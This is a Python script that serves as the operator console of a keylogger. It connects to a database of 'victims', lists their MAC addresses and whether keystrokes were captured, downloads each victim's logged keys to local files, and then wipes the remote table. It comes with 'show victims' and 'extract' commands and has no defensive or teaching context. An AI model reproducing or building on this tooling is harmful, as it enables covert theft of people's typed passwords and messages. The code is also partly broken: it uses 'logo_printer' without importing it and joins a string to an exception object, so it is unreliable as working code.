
from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials



def show_victim_data():
    global program_path

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
            host     = credentials['Server'],
            user     = credentials['Username'],
            passwd   = credentials['Password'],
            database = credentials['Database'],
            port     = credentials['Port']
        )

        my_cursor = sql_database.cursor()
        command = 'SELECT * FROM `key_logs`'
        my_cursor.execute(command)
        
        data = list(map(list,my_cursor.fetchall()))

        # proccess data here
        for row in data:
            if row[2] == '':
                row[2] = colors.Red + 'NO LOGS' + colors.RESET
            else:
                row[2] = colors.Green + 'LOGS EXISTS' + colors.RESET


        header = [[colors.BOLD + 'P_ID', colors.BOLD + 'MAC address', colors.BOLD + 'Key Logs' + colors.RESET]]

        table = AsciiTable(header + data)
        print(table.table)

        print(colors.RESET, end='\n\n')
        


    except Exception as error:
        print(colors.Red + '[✘]Error occured during the proccess')
        print('[✘]{}'.format(error) + colors.RESET)


def read_online_keys():
    try:
        global program_path
        credentials = read_credential_file(program_path)

        try:

            hacker_database = connect(
                host     = credentials['Server'],
                user     = credentials['Username'],
                passwd   = credentials['Password'],
                database = credentials['Database'],
                port     = credentials['Port']
            )

            # reading the data base
            my_cursor = hacker_database.cursor()
            command = "SELECT * FROM `key_logs`"
            my_cursor.execute(command)
            data = my_cursor.fetchall()

            report = extract_write_data(data)
            heading = ['P_ID', 'MAC_ADDR', 'LOG stat', 'Process stat']

            draw_table(heading, report)

            # clear the data base
            command = "UPDATE `key_logs` SET `keys` = ''"
            my_cursor.execute(command)

            print(colors.Green + '\n[✓]Database cleared\n' + colors.RESET)

            hacker_database.commit()

        except Exception as e:
            print(colors.Red + '[✘]Error occurred while connecting to the database')
            print(colors.Red + '[✘]' + e + colors.RESET)
            exit(0)

    except:
        print(colors.Red + '[✘]Error reading credentials' + colors.RESET)
        exit(0)


def extract_write_data(data_list):
    global program_path
    try:
        call(f"mkdir '{program_path}'/keylogs", shell=True)
    except:
        pass

    print('\n' + colors.Cyan + '[✓]Directory keylogs created')
    print(colors.Cyan + '[✓]Processing data' + colors.RESET, end='')

    # crete a empty list to append process report
    extract_report = []

    for row in data_list:

        p_id = row[0]
        mac_address = row[1]
        one_row_report = [p_id, mac_address]

        try:
            log = row[2]
            if len(log) > 0:
                one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
                with open(f"{program_path}/keylogs/p_id_{p_id}.txt", 'a') as log_file:
                    log_file.write('\n\n\n\n\n')
                    log_file.write(log)

            else:
                one_row_report.append(colors.Red + 'NO LOG' + colors.RESET)

            one_row_report.append('Completed')

        except Exception as error:
            while len(one_row_report) < 3:
                one_row_report.append('')
            print(error)
            one_row_report.append('Error')

        extract_report.append(one_row_report)

    return extract_report


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def activate_listener():
    # from the begining used command line interface
    global activated_option

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'show victims':
            show_victim_data()

        elif command == 'clear':
            call('clear', shell=True)

        elif command == 'extract':
            read_online_keys()

        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}listen({}KeyLogger{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == 'help':
            logo_printer.print_help()

        elif command == '' or command == ' ':
            pass

        else:
            print(colors.Red + '[✘]Invalid comand' + colors.RESET)


activate_listener()